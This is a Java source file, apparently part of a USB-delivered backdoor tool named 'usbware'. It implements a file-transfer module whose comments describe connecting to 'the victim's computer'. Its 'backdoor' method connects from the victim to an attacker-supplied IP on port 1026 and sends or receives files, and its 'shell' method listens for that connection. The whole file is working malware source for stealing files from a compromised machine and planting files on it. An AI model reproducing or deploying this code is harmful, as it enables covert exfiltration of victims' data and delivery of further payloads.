package com.github.thatcherdev.usbware.backend;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;

public class FTP {

	/**
	 * Opens a ServerSocketChannel for the victim's computer to connect to and
	 * transfer files with.
	 * 
	 * @param filePath path of file to send or receive
	 * @param protocol directions to send or receive files
	 * @return state of completion
	 */
	public static boolean shell(String filePath, String protocol) {
		ServerSocketChannel serverSocketChannel=null;
		SocketChannel socketChannel=null;
		try{
			serverSocketChannel=ServerSocketChannel.open();
			serverSocketChannel.socket().bind(new InetSocketAddress(1026));
			socketChannel=serverSocketChannel.accept();
			if(protocol.equals("send"))
				send(filePath, socketChannel);
			else if(protocol.equals("rec"))
				rec(filePath, socketChannel);
			return true;
		}catch(Exception e){
			return false;
		}finally{
			try{
				if(serverSocketChannel!=null)
					serverSocketChannel.close();
				if(socketChannel!=null)
					socketChannel.close();
			}catch(Exception e){}
		}
	}

	/**
	 * Opens a SocketChannel to connect to the server and transfer files with.
	 * 
	 * @param filePath path of file to send or receive
	 * @param protocol directions to send or receive files
	 * @param ip       IP address of server
	 * @return state of completion
	 */
	public static boolean backdoor(String filePath, String protocol, String ip) {
		SocketChannel socketChannel=null;
		try{
			socketChannel=SocketChannel.open();
			SocketAddress socketAddress=new InetSocketAddress(ip, 1026);
			socketChannel.connect(socketAddress);
			if(protocol.equals("send"))
				send(filePath, socketChannel);
			else if(protocol.equals("rec"))
				rec(filePath, socketChannel);
			return true;
		}catch(Exception e){
			return false;
		}finally{
			try{
				if(socketChannel!=null)
					socketChannel.close();
			}catch(Exception e){}
		}
	}

	/**
	 * Sends file over {@link socketChannel} via {@link fileChannel}.
	 * 
	 * @param filePath      path of file to send
	 * @param socketChannel
	 * @throws IOException
	 */
	private static void send(String filePath, SocketChannel socketChannel) throws IOException {
		RandomAccessFile file=new RandomAccessFile(new File(filePath), "r");
		FileChannel fileChannel=file.getChannel();
		ByteBuffer buffer=ByteBuffer.allocate(1024);
		while(fileChannel.read(buffer)>0){
			buffer.flip();
			socketChannel.write(buffer);
			buffer.clear();
		}
		file.close();
		fileChannel.close();
	}

	/**
	 * Receives file over {@link socketChannel} via {@link fileChannel}.
	 * 
	 * @param filePath      path of file to receive
	 * @param socketChannel
	 * @throws IOException
	 */
	private static void rec(String filePath, SocketChannel socketChannel) throws IOException {
		RandomAccessFile file=new RandomAccessFile(filePath, "rw");
		FileChannel fileChannel=file.getChannel();
		ByteBuffer buffer=ByteBuffer.allocate(1024);
		while(socketChannel.read(buffer)>0){
			buffer.flip();
			fileChannel.write(buffer);
			buffer.clear();
		}
		file.close();
		fileChannel.close();
	}
}